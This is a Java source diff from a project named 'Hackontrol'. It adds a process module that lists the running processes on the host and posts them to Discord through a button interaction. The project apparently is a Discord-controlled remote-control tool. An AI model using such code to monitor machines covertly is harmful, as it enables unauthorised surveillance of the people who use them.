@@ -1,13 +1,18 @@
 package com.khopan.hackontrol.module;
 
+import com.khopan.hackontrol.NativeLibrary;
+import com.khopan.hackontrol.ProcessEntry;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.registry.Registry;
+import com.khopan.hackontrol.utils.LargeMessage;
+import com.khopan.hackontrol.utils.interaction.HackontrolButton;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
+import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;
 
 public class ProcessModule extends Module {
 	private static final String MODULE_NAME = "process";
@@ -30,6 +35,46 @@ public class ProcessModule extends Module {
 	}
 
 	private void buttonSnapshot(ButtonContext context) {
+		ProcessEntry[] processList = NativeLibrary.listProcess();
+		int longestIdentifierLength = 0;
 
+		for(int i = 0; i < processList.length; i++) {
+			longestIdentifierLength = Math.max(longestIdentifierLength, Integer.toString(processList[i].processIdentifier).length());
+		}
+
+		longestIdentifierLength += 3;
+		int currentProcessIdentifier = NativeLibrary.currentIdentifier();
+		StringBuilder builder = new StringBuilder();
+
+		for(int x = 0; x < processList.length; x++) {
+			ProcessEntry entry = processList[x];
+
+			if(x > 0) {
+				builder.append('\n');
+			}
+
+			builder.append('`');
+			builder.append(entry.processIdentifier);
+			int space = longestIdentifierLength - Integer.toString(entry.processIdentifier).length();
+
+			for(int y = 0; y < space; y++) {
+				builder.append(' ');
+			}
+
+			builder.append(entry.executableFile);
+
+			if(entry.processIdentifier == currentProcessIdentifier) {
+				builder.append(" (Current Process)");
+			}
+
+			builder.append('`');
+		}
+
+		String text = builder.toString();
+		LargeMessage.send(text, context, this :: actionRow);
+	}
+
+	private void actionRow(MessageCreateRequest<?> request, long... identifiers) {
+		request.addActionRow(HackontrolButton.delete(identifiers));
 	}
 }
